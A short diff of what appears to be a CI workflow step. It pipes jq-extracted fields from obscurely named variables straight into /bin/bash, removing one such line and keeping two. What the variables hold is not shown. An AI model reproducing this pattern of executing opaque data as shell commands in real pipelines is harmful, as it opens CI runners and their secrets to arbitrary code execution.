@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$z72" | jq -r .vfpk5948 | /bin/bash
           printf '%s' "$cmgd76" | jq -r .msp1 | /bin/bash
-          echo $ylzu72 | jq -r .kohxd9 | /bin/bash
 
       - name: Upload results
         if: always()
